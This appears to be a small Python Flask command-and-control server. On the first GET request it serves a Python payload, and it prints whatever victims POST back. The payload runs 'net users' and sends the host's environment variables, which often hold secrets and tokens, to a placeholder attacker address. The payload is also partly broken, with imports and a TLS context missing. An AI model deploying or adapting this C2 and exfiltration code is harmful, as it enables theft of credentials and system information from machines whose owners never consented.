import os
import hashlib
from flask import request
from flask import Flask, jsonify


ASSETS_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__)


command = """
url = 'https://<YOUR_IP_HERE>:<YOUR_PORT_HERE>/'

import os
stream = os.popen('net users')
output = stream.read()

data = urllib.parse.urlencode({'result': os.environ.items()}).encode()
request =  Request(url, data=data)
response = urlopen(request, context=context)
"""

ran = False

@app.route('/', methods=['GET'])
def main_get():
    global runonce
    global ran

    if ran:
        return jsonify({})

    data = {
        'command': command,
    }

    ran = True

    return jsonify(data)

@app.route('/', methods=['POST'])
def main_post():
    print(request.form)
    return 'main_post()'


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=9898, debug=True, ssl_context='adhoc')